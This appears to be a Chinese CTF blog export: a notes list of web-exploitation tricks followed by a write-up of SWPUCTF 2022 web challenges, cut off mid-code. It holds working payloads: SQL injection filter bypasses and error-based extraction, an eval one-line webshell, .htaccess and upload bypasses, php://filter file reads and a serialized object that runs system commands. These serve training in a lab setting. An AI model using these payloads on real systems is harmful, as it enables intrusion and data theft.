  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line">echo <span class="built_in">intval</span>(&quot;<span class="number">42</span>&quot;); <span class="comment">// 输出: 42 </span></span><br><span class="line">echo <span class="built_in">intval</span>(&quot;<span class="number">42</span>abc&quot;); <span class="comment">// 输出: 42（遇到非数字字符停止转换） </span></span><br><span class="line">echo <span class="built_in">intval</span>(&quot;abc42&quot;); <span class="comment">// 输出: 0（无法转换则返回 0）</span></span><br><span class="line">echo <span class="built_in">intval</span>(<span class="number">4.9</span>); <span class="comment">// 输出: 4（直接取整，不是四舍五入） </span></span><br><span class="line">echo <span class="built_in">intval</span>(-<span class="number">4.9</span>); <span class="comment">// 输出: -4</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><ul>
<li>sql注入单引号被过滤的时候用双引号</li>
<li>常见sql注入过滤  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOHOTKEY"><figure class="iseeu highlight /autohotkey"><table><tr><td class="code"><pre><span class="line">空格过滤 → 用 `/**/`、`%<span class="number">0</span>a`、`%<span class="number">0</span>d` 代替。</span><br><span class="line">引号过滤 → 用 `Hex` 编码或字符串函数（如 `CHAR(<span class="number">97</span>)`）。</span><br><span class="line">关键词过滤  → 尝试大小写、内联注释（`SEL<span class="comment">/*!*/</span>ECT`）、冗余语法（`UNION ALL SELECT`）。</span><br><span class="line">逗号过滤  → 使用 `JOIN` 代替 `UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>`。</span><br><span class="line">等号过滤  → 用 `LIKE` 或 `IN` 绕过，例如 `WHERE id LIKE <span class="number">1</span>`。</span><br></pre></td></tr></table></figure></div></li>
<li>数据库查询长度超出待查询的字符串后会返回特殊字符 NULL 或者 ！等</li>
<li>mysql中的反引号是为了区分 MYSQL 的保留字与普通字符，所以没有过滤反引号就可以用反引号来绕过 保留字比如user</li>
<li>mysql可以用load_file()函数读取文件union select load_file(‘path_to_file’) 目录可以选&#x2F;var&#x2F;www&#x2F;html&#x2F;</li>
<li>在 MySQL 中，<code>WHERE</code> 子句在比较字符串时会忽略字符串末尾的空格。例如，当执行 <code>SELECT * FROM table WHERE column = &#39;cs &#39;;</code> 时，MySQL 会将其视为 <code>&#39;cs&#39;</code> 进行比较，只要 <code>column</code> 列的值为 <code>&#39;cs&#39;</code> 就会匹配成功。这一特性可以用于绕过一些输入过滤机制。</li>
<li><strong>CHAR 和 VARCHAR 列有最大长度限制</strong>：当给 <code>CHAR</code> 或 <code>VARCHAR</code> 列赋值时，如果值的长度超过了列的最大长度，就会对值进行裁剪以使其适合列的长  度。<br>&emsp;<strong>严格 SQL 模式的影响</strong>：<br>&emsp;<strong>严格模式下</strong>：如果被裁掉的字符不是空格，会产生错误并禁用值的插入。<br>&emsp;<strong>非严格模式下</strong>：不管被裁掉的字符是什么，都会直接截断值，不会产生错误。<br>(用法举例，在严格模式下，已知有个admin账号，可以创建一个用户，admin然后很多空格后面在随便加什么，然后会截断，再根据上一条，where中查询空格不会被计算)</li>
<li><code>extractvalue (1,concat (0x7e,database ()))</code> 根据错误信息爆库名的时候用到<br>EXTRACTVALUE() 是 MySQL 的一个 XML 处理函数，它用于从 XML 数据中提取特定的值.但如果传入 非 XML 结构 的 XPath，会报错，并在错误信息中泄露数据.CONCAT() 用于拼接字符串。0x7e 是 十六进制的 ~（波浪号）用于报错信息可以回显  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>：<span class="number">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,database()))#</span><br><span class="line"></span><br><span class="line"><span class="attribute">XPATH</span> syntax error: &#x27;~test_db&#x27;</span><br></pre></td></tr></table></figure></div></li>
<li>sql注入中可以用<code>substring</code>函数来绕过字符长度限制  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>：-<span class="number">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,extractvalue(<span class="number">0</span>x7e,(select substring(group_concat(flag),<span class="number">25</span>,<span class="number">32</span>) from test_tb)) #</span><br><span class="line"></span><br><span class="line"><span class="attribute">XPATH</span> syntax error: &#x27;a-ff5d9638a322&#125;&#x27;</span><br></pre></td></tr></table></figure></div></li>
<li>sql中 <code>LIMIT</code> 主要用于 <strong>限制查询结果的数量</strong>，通常用于分页、提高查询效率等。<br>  <code>SELECT * FROM table_name LIMIT 偏移量，数量;</code>，就是在你确定sql语句没错的时候，返回的内容没错但是不是想要的，可以在后面加上limit 1,1试试</li>
<li>sql注入中最后知道列名查值的时候，1，group_concat(),3这里括号中的名字不要引号，最后的from也不用。在爆表的时候要在库名和列名要在后面的库名或者表名加引号</li>
</ul>
<h2 id="ctf中的linux"><a href="#ctf中的linux" class="headerlink" title="ctf中的linux"></a>ctf中的linux</h2><ul>
<li>nl 命令在 <a href="http://codex.wordpress.org.cn/Linux">linux</a> 系统中用来计算文件中行号。nl 可以将输出的文件内容自动的加上行号！其默认的结果与 cat -n 有点不太一样， nl 可以将行号做比较多的显示设计，包括位数与是否自动补齐 0 等等的功能。（一般对输入字符有限制的时候用</li>
<li>linux中<code>*</code>会把目录中的第一个匹配到的文件名当作命令 剩下的文件名当作参数执行</li>
<li>在大多数 Linux 系统中，PHP 默认会将 Session 数据存储在 <code>/tmp</code> 目录下，文件名通常以 <code>sess_</code> 为前缀，后跟 Session ID。</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/tmp/</span>sess_abc123def456</span><br></pre></td></tr></table></figure></div>
<ul>
<li>在单引号字符串中插入单引号的办法<code>&#39;&quot;&#39;&quot;&#39;</code><br>&emsp;原理： <strong>将字符串拆分成多段</strong>，通过交替使用单引号 <code>&#39;</code> 和双引号 <code>&quot;</code>，间接插入单引号字符。其实就是一种拼接的形式  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOIT"><figure class="iseeu highlight /autoit"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 错误示例，会导致解析错误 echo <span class="string">&#x27;This is a &#x27;</span>test<span class="string">&#x27; string.&#x27;</span> </span></span><br><span class="line">    <span class="meta"># 正确示例 echo <span class="string">&#x27;This is a &#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;test&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27; string.&#x27;</span></span></span><br><span class="line">    <span class="meta">#等效于</span></span><br><span class="line">    <span class="string">&#x27;&lt;?php system (&#x27;</span> + <span class="string">&quot;&#x27;&quot;</span> + <span class="string">&#x27;cat fl*&#x27;</span> + <span class="string">&quot;&#x27;&quot;</span> + <span class="string">&#x27;);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure></div></li>
<li><code>$IFS</code>（Internal Field Separator）是 Bash 里的内部字段分隔符，默认是空格。</li>
<li>在linux中命令中间有分隔符，单引号双引号反斜杠反引号也可以照样执行命令比如<code>l&#39;&#39;s l&quot;&quot;s l\s l``s</code></li>
</ul>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><ul>
<li><code>php3，php5，pht，phtml，phps</code> 都是 php 可运行的文件扩展名</li>
<li><code>.htaccess</code> 是一个纯文本文件，它里面存放着 Apache 服务器配置相关的指令。<br> .htaccess 主要的作用有：URL 重写、自定义错误页面、MIME 类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义 404 错误页面、阻止 &#x2F; 允许特定 IP&#x2F;IP 段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。<br> .htaccess 的用途范围主要针对当前目录。  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line">   <span class="comment"># jpg文件解析成php文件</span></span><br><span class="line">   <span class="section">&lt;FilesMatch <span class="string">&quot;\.jpg$&quot;</span>&gt;</span></span><br><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure></div></li>
<li>在 php 中 <code>&quot;.user.ini&quot;</code> 有如下解释：php 会在每个目录下搜寻文件名，如果设定为空字符串则 php 不会搜寻，也就是在 “.user.ini” 中如果设置了文件    名，那么任意一个页面都将该文件中的内容包含进去。有两种方法：<br> auto_prepend_file: 在页面顶部加载文件<br> auto_append_file: 在页面底部加载文件<br> 而且这种方式解析的文件都会被当作php文件执行，在一些文件上传题目也会碰到</li>
<li>在文件内容的开头输入 <code>GIF89a</code> 主要用于绕过 <strong>MIME 类型检测</strong> 和 <strong>Web 服务器的文件格式验证</strong>，在有检测上传文件类型的题目中可以在修改成jpg文件的前面加上这句</li>
<li>文件上传的题目如果对文件的类型有检测就要修改<code>MIME</code>就是content-type 比如<code>image/jpeg</code></li>
<li>如果是文件上传题对图片的宽和高有要求，尝试在木马文件上面自己定义宽和高  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> height 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> width 1</span></span><br></pre></td></tr></table></figure></div></li>
<li>Apache 解析漏洞主要是因为 Apache 默认一个文件可以有多个用。分割得后缀，当最右边的后缀无法识别（mime.types 文件中的为合法后缀）则继续向左看，直到碰到合法后缀才进行解析（以最后一个合法后缀为准） 在一些文件上传问题中可能出现这个问题  所以如果黑名单比较简单，后缀名只看从第一个.开始，就可以上传类似1.php.aaa这样的文件</li>
</ul>
<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><ul>
<li>php 的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup ();  PHP5 &lt; 5.6.25、PHP7 &lt; 7.0.10</li>
<li>如果 PHP 代码使用了 <code>__autoload()</code> 或 <code>spl_autoload_register()</code>，那么在 <code>unserialize()</code> 时，PHP 会尝试自动加载不存在的类。攻击者可能通过控制 <code>autoload</code> 机制，使其加载恶意代码。  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="code"><pre><span class="line">   spl_autoload_register(function(<span class="variable">$class</span>) &#123;</span><br><span class="line">    include <span class="string">&quot;/tmp/<span class="variable">$class</span>.php&quot;</span>; <span class="regexp">//</span> 如果 <span class="class"><span class="keyword">class</span> 不存在，会自动尝试加载</span></span><br><span class="line"><span class="class">&#125;)</span>;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="string">&#x27;O:8:&quot;Malicious&quot;:0:&#123;&#125;&#x27;</span>); <span class="regexp">//</span>假设类 Malicious 不存在，PHP 会通过已注册的自动加载函数尝试加载 /tmp/Malicious.php 文件</span><br></pre></td></tr></table></figure></div></li>
<li>php序列化中的表示<code>O:&lt;类名长度&gt;:&quot;&lt;类名&gt;&quot;:&lt;成员数量&gt;:&#123;&lt;成员&gt;&#125;</code></li>
<li><code>die</code>函数也能调用<code>__toString()</code>方法</li>
<li>两个变量同时指向<code>同一个内存地址</code>也可以绕过<code>wakeup</code>,因为这样就是修改另一个变量从而修改被修改的变量的值</li>
<li>当你试图访问一个<strong>不存在</strong>或<strong>不可访问</strong>（如 <code>private</code>）的属性时，<code>__get()</code> 方法会被自动调用。</li>
<li>在 PHP 中，<code>__call()</code> 是一个 <strong>魔法方法</strong>，当调用<strong>未定义</strong>或<strong>不可访问</strong>（如 <code>private</code>）的方法时，它会被自动触发。</li>
</ul>
<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><ul>
<li><p>得到信息没有flag字样的时候想想是不是base64等编码</p>
</li>
<li><p>php伪协议无法使用就用日志注入 蚁剑中的https证书忽略打开  做过一题限制了显示个数 所以不能尝试太多</p>
</li>
<li><p>写入的 <code>session</code> 马上又会被删除，使用我们利用 bp 不断的发包</p>
</li>
<li><p>url在字符前加<code>~</code>就是取反，可以用于字母绕过,因为取反的之后的字符大部分都是不可见字符</p>
  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">   <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div></li>
<li><p>php中的<code> $str = preg_replace(&#39;/NSSCTF/&#39;,&quot;&quot;,$_GET[&#39;str&#39;]);</code>如果是将敏感词置换为空，就可以用双写置换，这里就是<code>NSSNSSCTFCTF</code></p>
</li>
<li><p>只能写三个字符但是比一个很大的数字大可以用<code>科学计数法</code>9e9</p>
</li>
<li><p><code>%09</code>的url解码是&#x2F;t（制表符）有时候空格绕过${IFS}也不行的时候用这个</p>
</li>
<li><p>一些题目中如果过滤了?或者php。又要上传一句话木马，可以上传<code>script版本</code>的</p>
  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;a&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li>
<li><p>都是两个数字一组的加密字符串，不一定是hex，还有可能是<code>tapcode</code>敲击码</p>
</li>
<li><p>sql注入中，如果<code>or</code>或者union这种关键字被过滤尝试双写绕过,而且比如or被过滤那information里面含or也会被过滤</p>
</li>
<li><p>蚁剑成功连接之后如果无法看到里面的文件，试试<code>虚拟终端</code>中查看</p>
</li>
<li><p>如果cat无法查看，尝试<code>tac</code></p>
</li>
<li><p><code>mt_srand (seed)</code> 用于 初始化随机数生成器，其中 seed 是随机数种子。影响：如果使用相同的 seed，那么后续调用 mt_rand () 生成的随机数 始终相同。</p>
</li>
<li><p>有时<code>页面源代码</code>中有可以访问的源代码文件</p>
</li>
</ul>
<h2 id="其他语言知识"><a href="#其他语言知识" class="headerlink" title="其他语言知识"></a>其他语言知识</h2><ul>
<li>在 Python 正则表达式中，”.” 表示匹配除了换行符之外的任意单个字符，”<em>“ 表示匹配前面的字符零次或多次。因此，”.</em>“ 表示匹配任意长度的字符序列，这也被称为贪婪匹配 (greedy matching)。 注意到这个除了换行符以外，所以可以用<code>%a</code>绕过一些正则匹配，前面是换行就匹配不到</li>
<li>参数传递是大括号的时候，考虑原型链污染，使用的是<code>__proto__</code>这个私有属性,用这个修改原型的属性，当再创建一个实例的时候，就会继承被修改过的原型的属性</li>
<li>python中：<br>  <code>__class__</code> 获取对象的类。<br>  <code>__init__</code> 获取类的构造方法。<br>  <code>__globals__</code> 获取该类<strong>定义时的全局变量</strong>。<br>  示例  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">f1ag = request.<span class="keyword">args</span>.<span class="built_in">get</span>(<span class="string">&#x27;f1ag&#x27;</span>) <span class="built_in">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">exp</span> = request.<span class="keyword">args</span>.<span class="built_in">get</span>(<span class="string">&#x27;exp&#x27;</span>) <span class="built_in">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">message = <span class="string">&quot;Your flag is &#123;0&#125;&quot;</span> + <span class="built_in">exp</span></span><br><span class="line"></span><br><span class="line">?flag=<span class="number">1</span>&amp;<span class="built_in">exp</span>=&#123;<span class="number">0</span>.__class__.__init__.__globals__&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPUCTF_2022新生赛(web)WP</title>
    <url>/posts/38113.html</url>
    <content><![CDATA[<p>SWPUCTF_2022新生赛web方向wp</p>
<span id="more"></span>
<p>做题平台:<a href="https://www.nssctf.cn/problem">nssctf</a></p>
<h1 id="ez-ez-php"><a href="#ez-ez-php" class="headerlink" title="ez_ez_php"></a>ez_ez_php</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">3</span>) === <span class="string">&quot;php&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure></div>
<p>只要<code>file</code>参数前三个数是php就包含这个文件，所以用php伪协议读文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:26709/?file=php://filter/read=convert.base64-encode/resource=flag</span><br><span class="line">Nice!!!TlNTQ1RGezRiMTAyN2E1LWYwMmYtNDk1MC05NjhhLTNiZTI4NDFiZGE3MH0K</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> TlNTQ1RGezRiMTAyN2E1LWYwMmYtNDk1MC05NjhhLTNiZTI4NDFiZGE3MH0K | <span class="built_in">base64</span> -d</span><br><span class="line">NSSCTF&#123;4b1027a5-f02f-4950-968a-3be2841bda70&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="ez-ez-php-revenge"><a href="#ez-ez-php-revenge" class="headerlink" title="ez_ez_php (revenge)"></a>ez_ez_php (revenge)</h1><p>题目和上题一模一样<br>但是现在用上题的payload就只有一个nice没有显示flag,但是这里就是路径变了改成根目录下的flag就可以</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:26620/?file=php://filter/read=convert.base64-encode/resource=/flag</span><br><span class="line">Nice!!!TlNTQ1RGezA3NThlMzNjLWI3MmMtNDIyNy04NzA0LTFiOTcxN2Y3NjI0MH0K</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> TlNTQ1RGezA3NThlMzNjLWI3MmMtNDIyNy04NzA0LTFiOTcxN2Y3NjI0MH0K | <span class="built_in">base64</span> -d</span><br><span class="line">NSSCTF&#123;0758e33c-b72c-4227-8704-1b9717f76240&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="1z-unserialize"><a href="#1z-unserialize" class="headerlink" title="1z_unserialize"></a>1z_unserialize</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;NSSCTF.com&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span>;</span><br><span class="line">     </span><br><span class="line">     <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;lt;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$a</span>(<span class="variable language_">$this</span>-&gt;lly);</span><br><span class="line">     &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nss&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>
<p>这是一个反序列化题，那就是<code>$lt</code>变量赋值给<code>$a</code>,然后<code>$a</code>可以当作一个函数,内容是<code>lly</code><br>这里还要注意一下这个类有三个变量，虽然用到的只有两个，但是我们自己写的时候也要把三个变量都写出来</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lyh</span>();</span><br><span class="line"><span class="variable">$m</span> -&gt; lt = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$m</span> -&gt; lly = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$m</span>));</span><br><span class="line"></span><br><span class="line">O:<span class="number">3</span>:<span class="string">&quot;lyh&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;url&quot;</span>;N;s:<span class="number">2</span>:<span class="string">&quot;lt&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;lly&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;ls /&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后用POST方式传入nss参数<br><img src="https://pic1.imgdb.cn/item/67b1eae8d0e0a243d4ffdea6.png"><br>找到flag在&#x2F;flag，然后把lly改成”cat &#x2F;flag”再传入就可以</p>
<h1 id="奇妙的-MD5"><a href="#奇妙的-MD5" class="headerlink" title="奇妙的 MD5"></a>奇妙的 MD5</h1><p><img src="https://pic1.imgdb.cn/item/67b1eb60d0e0a243d4ffdeb2.png"><br>我怕，题目是md5，我们就把特殊的md5之后以0e开头的字符串输入试试<br>但是没有用，然后看页面源代码，也没有信息<br>丛标头中找到一个hint<br><img src="https://pic1.imgdb.cn/item/67b1ec81d0e0a243d4ffdedf.png"><br>这个我在做ctfshow中的题目有碰到过<br>md5($str, false) 这是md5的默认情况 返回32位16进制数   如果是 md5($str, true)就返回16位二进制数      ffifdyop 是true参数时候的漏洞  md5 (‘ffifdyop’,true)&#x3D;’or’6xxxxxx<br>所有这里输入<code>ffifdyop</code> 跳转到c0nt1nue.php<br>查看源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl http://node5.anna.nssctf.cn:24841/c0nt1nue.php                                                       </span><br><span class="line">&lt;!--</span><br><span class="line"><span class="variable">$x</span>= <span class="variable">$GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="variable">$y</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span> != <span class="variable">$y</span> &amp;&amp; md5(<span class="variable">$x</span>) == md5(<span class="variable">$y</span>))&#123;</span><br><span class="line">    ;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>
<p>这里就是get传入两个不同字符串 md5相同的字符串，这个熟悉了<br>就传入<code>240610708</code> <code>QNKCDZO</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GML"><figure class="iseeu highlight /gml"><table><tr><td class="code"><pre><span class="line">?<span class="variable language_">x</span>=<span class="number">240610708</span>&amp;<span class="variable language_">y</span>=QNKCDZO</span><br></pre></td></tr></table></figure></div>
<p>进入到最后一个页面</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;wqh&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;dsy&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;wqh&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dsy&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里要用数组绕过md5<br>在 PHP 中，如果 md5() 作用于一个数组，它不会计算哈希，而是返回 NULL，但不会报错（因为 error_reporting(0); 关闭了错误输出）。<br><img src="https://pic1.imgdb.cn/item/67b1f05bd0e0a243d4ffdfa3.png"><br>这样子就是两个数组都是NULL了</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>!=</code></td>
<td><strong>不等于</strong>（只比较值，允许类型转换）</td>
</tr>
<tr>
<td><code>!==</code></td>
<td><strong>全不等</strong>（值或类型不同都算不等）</td>
</tr>
</tbody></table>
<h1 id="ez-ez-unserialize"><a href="#ez-ez-unserialize" class="headerlink" title="ez_ez_unserialize"></a>ez_ez_unserialize</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span> = <span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$x</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;x = <span class="variable">$x</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;x !== <span 